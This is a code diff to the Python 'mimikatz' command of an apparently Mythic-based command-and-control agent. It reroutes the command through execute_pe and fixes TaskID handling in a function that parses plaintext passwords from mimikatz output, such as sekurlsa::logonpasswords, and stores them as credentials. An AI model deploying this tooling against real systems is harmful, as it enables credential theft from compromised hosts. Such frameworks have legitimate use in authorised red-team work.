@@ -2,6 +2,7 @@ from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 import json
 import mslex
+from .execute_pe import *
 
 
 class MimikatzArguments(TaskArguments):
@@ -34,6 +35,7 @@ class MimikatzArguments(TaskArguments):
 
         self.remove_arg("commands")
 
+
 async def parse_credentials(
     task: PTTaskCompletionFunctionMessage,
 ) -> PTTaskCompletionFunctionMessageResponse:
@@ -41,8 +43,9 @@ async def parse_credentials(
         Success=True, TaskStatus="success", Completed=True
     )
     responses = await SendMythicRPCResponseSearch(
-        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
+        MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
     )
+    logger.info(responses.Responses)
     for output in responses.Responses:
         mimikatz_out = str(output.Response)
         comment = "task {}".format(output.TaskID)
@@ -61,7 +64,7 @@ async def parse_credentials(
                     if passwd != "(null)":
                         cred_resp = await SendMythicRPCCredentialCreate(
                             MythicRPCCredentialCreateMessage(
-                                TaskID=task.SubtaskData.Task.ID,
+                                TaskID=task.TaskData.Task.ID,
                                 Credentials=[
                                     MythicRPCCredentialData(
                                         credential_type="plaintext",
@@ -84,7 +87,7 @@ class MimikatzCommand(CommandBase):
     needs_admin = False
     help_cmd = "mimikatz [command1] [command2] [...]"
     description = "Execute one or more mimikatz commands (e.g. `mimikatz coffee sekurlsa::logonpasswords`)."
-    version = 2
+    version = 3
     author = "@djhohnstein"
     argument_class = MimikatzArguments
     attackmapping = [
@@ -98,34 +101,33 @@ class MimikatzCommand(CommandBase):
         "T1552",
         "T1550",
     ]
-    script_only = True
+    script_only = False
     completion_functions = {"parse_credentials": parse_credentials}
 
     async def create_go_tasking(
         self, taskData: PTTaskMessageAllData
     ) -> PTTaskCreateTaskingMessageResponse:
-        response = PTTaskCreateTaskingMessageResponse(
-            TaskID=taskData.Task.ID,
-            Success=True,
-        )
-
         commandline = taskData.args.get_arg("commandline")
-        response.DisplayParams = commandline
-
-        await SendMythicRPCTaskCreateSubtask(
-            MythicRPCTaskCreateSubtaskMessage(
-                TaskID=taskData.Task.ID,
-                CommandName="execute_pe",
-                Params=json.dumps(
-                    {
-                        "pe_name": "mimikatz.exe",
-                        "pe_arguments": commandline,
-                    }
-                ),
-                SubtaskCallbackFunction="parse_credentials",
-            )
-        )
-        return response
+        # we're going to call execute_pe, so prep args, parse them, and generate the command
+        executePEArgs = ExecutePEArguments(command_line=json.dumps(
+            {
+                "pe_name": "mimikatz.exe",
+                "pe_arguments": commandline,
+            }
+        ))
+        await executePEArgs.parse_arguments()
+        executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
+                                            agent_code_path=self.agent_code_path,
+                                            agent_browserscript_path=self.agent_browserscript_path)
+        # set our taskData args to be the new ones for execute_pe
+        taskData.args = executePEArgs
+        # executePE's creat_go_tasking function returns a response for us
+        newResp = await executePECommand.create_go_tasking(taskData=taskData)
+        # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
+        newResp.CommandName = "execute_pe"
+        newResp.DisplayParams = commandline
+        newResp.CompletionFunctionName = "parse_credentials"
+        return newResp
 
     async def process_response(
         self, task: PTTaskMessageAllData, response: any
